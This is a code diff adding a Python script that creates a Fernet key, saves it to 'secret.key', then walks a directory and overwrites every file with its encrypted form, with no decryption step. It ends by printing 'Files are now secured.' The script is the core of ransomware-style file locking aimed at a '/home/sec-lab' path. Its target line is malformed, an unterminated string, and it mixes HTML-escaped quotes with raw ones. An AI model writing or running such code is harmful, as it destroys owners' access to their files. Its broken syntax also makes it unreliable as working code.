@@ -1,0 +1,39 @@
+import os
+from cryptography.fernet import Fernet
+
+# Function to create an encryption key
+def generate_key():
+    key = Fernet.generate_key()
+    with open(&quot;secret.key&quot;, &quot;wb&quot;) as key_file:
+        key_file.write(key)
+
+# Function to load the stored encryption key
+def load_key():
+    return open(&quot;secret.key&quot;, &quot;rb&quot;).read()
+
+# Function to encrypt a file
+def encrypt_file(file_path, key):
+    cipher = Fernet(key)
+    with open(file_path, &quot;rb&quot;) as file:
+        file_data = file.read()
+    encrypted_data = cipher.encrypt(file_data)
+    with open(file_path, &quot;wb&quot;) as file:
+        file.write(encrypted_data)
+
+# Function to encrypt all files in a directory
+def encrypt_directory(directory, key):
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            encrypt_file(file_path, key)
+
+# Generate and store the encryption key
+generate_key()
+
+# Load the encryption key
+encryption_key = load_key()
+
+# Encrypt the target directory
+encrypt_directory("/home/sec-lab/c;, encryption_key)
+
+print(&quot;Encryption complete. Files are now secured.&quot;)
